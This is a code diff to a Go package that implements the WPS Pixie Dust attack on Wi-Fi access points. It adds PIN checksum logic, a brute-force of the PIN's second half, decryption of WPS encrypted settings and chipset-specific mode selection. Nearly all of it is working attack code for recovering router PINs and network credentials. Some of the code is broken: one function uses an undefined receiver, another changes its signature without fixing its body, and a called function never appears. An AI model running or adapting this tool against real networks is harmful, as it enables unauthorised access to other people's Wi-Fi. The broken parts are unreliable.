@@ -19,6 +19,8 @@ package pixiedust
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/hmac"
 	"crypto/sha256"
 	"encoding/binary"
@@ -41,7 +43,7 @@ type pixieDustAttack struct {
 	eNonce   []byte
 	rNonce   []byte
 	ebssid   net.HardwareAddr
-	modes    [5]uint8
+	modes    []uint8
 	m5enc    []byte
 	m7enc    []byte
 	force    bool
@@ -64,21 +66,13 @@ func newPixieDust(args []string) pixieDustAttack {
 
 func (pda *pixieDustAttack) execute() {
 	timeStart := time.Now()
-
-	dhKey, err := computeDHKey(pda.pkr)
-	
-	h := hmac.New(sha256.New, dhKey)
-	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
-	kdk := h.Sum(nil)
-
-	authkey, wrapkey, emsk := keyDerivationFunction(kdk)
-
+    pda.executeRTL819xCase()
 	displayTime(timeStart)
 }
 
 
 
-func computeDHKey(pkr []byte) ([]byte, error) {
+func computeDHKey(pkr []byte) ([]byte) {
     eKey := bytes.Repeat([]byte{0x55}, 192)
 	
     sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
@@ -106,22 +100,13 @@ func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
 
 
 
-func (pda *pixieDustAttack) validatePKE() error {
-    if !pda.isRTL819xPKE() {
-        return fmt.Errorf("Model not supported! (PKE does not match RTL819x)")
-    }
-    return nil
-}
-
-
-
 func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
     b := new(big.Int).SetBytes(base)
     e := new(big.Int).SetBytes(power)
     m := new(big.Int).SetBytes(modulus)
 
     if m.Sign() == 0 || m.Cmp(big.NewInt(1)) == 0 {
-        return nil, errors.New("modulus must be greater than 1")
+        return nil, errors.New("Modulus must be greater than 1")
     }
 
     result := new(big.Int).Exp(b, e, m)
@@ -164,16 +149,6 @@ func keyDerivationFunction(key []byte) (authKey, wrapKey, emsk []byte) {
 func emptyPinHMAC(authkey []byte) []byte {
     h := hmac.New(sha256.New, authkey)
     return h.Sum(nil)
-}
-
-
-
-var glibcSeedTbl = []uint32{
-    0x0128e83b, 0x00dafa31, 0x009f4828, 0x00f66443, 0x00bee24d, 0x00817005, 0x00cb918f,
-    0x00a64845, 0x0069c3cf, 0x00a76dbd, 0x0090a848, 0x0057025f, 0x0089126c, 0x007d9a8f,
-    0x0048252a, 0x006fb2d4, 0x006ccc15, 0x003c5744, 0x005a998f, 0x005df917, 0x0032ed77,
-    0x00492688, 0x0050e901, 0x002b5f57, 0x003acd0b, 0x00456b7a, 0x0025413d, 0x002f11f4,
-    0x003b564d, 0x00203f14, 0x002589fc, 0x003283f8, 0x001c17e4, 0x001dd823,
 }
 
 
@@ -226,6 +201,67 @@ func glibcFastNonce(seed uint32) []byte {
 
 
 
+func decryptEncryptedSettings(wrapKey, encr []byte) ([]byte, error) {
+    const blockSize = 16
+    if len(encr) < 2*blockSize || len(encr)%blockSize != 0 {
+        return nil, errors.New("invalid encrypted data length")
+    }
+
+    iv         := encr[:blockSize]
+    ciphertext := encr[blockSize:]
+
+    block, err := aes.NewCipher(wrapKey)
+    if err != nil {
+        return nil, err
+    }
+
+    mode      := cipher.NewCBCDecrypter(block, iv)
+    plaintext := make([]byte, len(ciphertext))
+    mode.CryptBlocks(plaintext, ciphertext)
+
+    padLen := int(plaintext[len(plaintext)-1])
+    if padLen == 0 || padLen > len(plaintext) {
+        return nil, errors.New("invalid padding")
+    }
+
+    for i := len(plaintext) - padLen; i < len(plaintext); i++ {
+        if plaintext[i] != byte(padLen) {
+            return nil, errors.New("invalid padding")
+        }
+    }
+
+    return plaintext[:len(plaintext)-padLen], nil
+}
+
+
+
+type IEVTag struct {
+    ID   uint16
+    Len  uint16
+    Data []byte
+}
+
+func findVTag(data []byte, targetID uint16, targetLen int) *IEVTag {
+    for i := 0; i+4 <= len(data); {
+        id := binary.BigEndian.Uint16(data[i : i+2])
+        length := int(binary.BigEndian.Uint16(data[i+2 : i+4]))
+        if i+4+length > len(data) {
+            return nil
+        }
+        if id == targetID && (targetLen == 0 || length == targetLen) {
+            return &IEVTag{
+                ID:   id,
+                Len:  uint16(length),
+                Data: data[i+4 : i+4+length],
+            }
+        }
+        i += 4 + length
+    }
+    return nil
+}
+
+
+
 func crackFirstHalf(authkey, eS1, pke, pkr, eHash1, emptyPsk []byte) (int, []byte, bool, bool) {
     if checkEmptyPinHalf(eS1, authkey, pke, pkr, eHash1, emptyPsk) {
         return 0, emptyPsk, true, true
@@ -271,6 +307,143 @@ func checkEmptyPinHalf(es, authkey, pke, pkr, ehash, emptyPsk []byte) bool {
     h.Write(pkr)
     hash := h.Sum(nil)
     return hmac.Equal(hash, ehash)
+}
+
+
+
+func wpsPinChecksum(pin int) int {
+    acc := 0
+    for pin > 0 {
+        acc += 3 * (pin % 10)
+        pin /= 10
+        acc += pin % 10
+        pin /= 10
+    }
+    return (10 - acc%10) % 10
+}
+
+
+
+func wpsPinValid(pin int) bool {
+    return wpsPinChecksum(pin/10) == pin%10
+}
+
+
+
+func uintToCharArray(num, length int) string {
+    return fmt.Sprintf("%0*d", length, num)
+}
+
+
+
+func crackSecondHalf(authkey, eS2, pke, pkr, eHash2, emptyPsk []byte, firstHalf int) (string, []byte, error) {
+    if firstHalf == 0 {
+        h := hmac.New(sha256.New, authkey)
+        h.Write(eS2)
+        h.Write(emptyPsk)
+        h.Write(pke)
+        h.Write(pkr)
+        if hmac.Equal(h.Sum(nil), eHash2) {
+            return "", emptyPsk, nil
+        }
+    }
+
+    for sh := 0; sh < 1000; sh++ {
+        checksum := wpsPinChecksum(firstHalf*1000 + sh)
+        secondHalfValue := sh*10 + checksum
+        sPin := uintToCharArray(secondHalfValue, 4)
+
+        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
+        if ok {
+            pinFull := firstHalf*10000 + secondHalfValue
+            return fmt.Sprintf("%08d", pinFull), psk, nil
+        }
+    }
+
+    for sh := 0; sh < 10000; sh++ {
+        pinFull := firstHalf*10000 + sh
+        if wpsPinValid(pinFull) {
+            continue
+        }
+        sPin := uintToCharArray(sh, 4)
+        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
+        if ok {
+            return fmt.Sprintf("%08d", pinFull), psk, nil
+        }
+    }
+
+    return "", nil, fmt.Errorf("second half not found")
+}
+
+
+
+func validateArgs(wps *WPS, start, end *int64) error {
+    // 1. Mutuamente exclusivos
+    if wps.PKR != nil && wps.SmallDHKeys {
+        return errors.New("--dh-small and --pkr are mutually exclusive")
+    }
+    // 2. Pelo menos um
+    if wps.PKR == nil && !wps.SmallDHKeys {
+        return errors.New("either --pkr or --dh-small must be specified")
+    }
+    // 3. Detecção automática
+    if wps.PKR != nil && checkSmallDHKeys(wps.PKR) {
+        wps.SmallDHKeys = true
+    }
+    // 4. Obrigatórios
+    if wps.PKE == nil || wps.EHash1 == nil || wps.EHash2 == nil || wps.ENonce == nil {
+        return errors.New("missing required arguments: --pke, --e-hash1, --e-hash2, --e-nonce")
+    }
+    if wps.AuthKey == nil {
+        if !wps.SmallDHKeys && !bytes.Equal(wps.PKE, wpsRtlPke) {
+            return errors.New("--authkey required when not using --dh-small or RTL819x PKE")
+        }
+        if wps.EBSSID == nil || wps.RNonce == nil {
+            return errors.New("--e-bssid and --r-nonce required when --authkey not provided")
+        }
+    }
+    // 5. --force com --start/--end
+    if wps.Bruteforce && (start != nil || end != nil) {
+        return errors.New("cannot specify --start or --end with --force")
+    }
+    return nil
+}
+
+
+
+func checkSmallDHKeys(data []byte) bool {
+    if len(data) != wpsPkeyLen {
+        return false
+    }
+    for i := 0; i < wpsPkeyLen - 1; i++ {
+        if data[i] != 0 {
+            return false
+        }
+    }
+    return data[wpsPkeyLen - 1] == 0x02
+}
+
+
+
+func getAutoModes(pke, eNonce []byte) []int {
+    modes := make([]int, 0, 4)
+
+    if pda.isRTL819xPKE() {
+        return []int{rtl819x}
+    }
+
+    modes = append(modes, rt)
+
+    if len(eNonce) >= 16 &&
+        eNonce[0] < 0x80 && eNonce[4] < 0x80 &&
+        eNonce[8] < 0x80 && eNonce[12] < 0x80 {
+        modes = append(modes, rtl819x)
+        modes = append(modes, eCosSimple)
+    } else {
+        modes = append(modes, eCosSimple)
+    }
+
+    return modes
 }
 
 
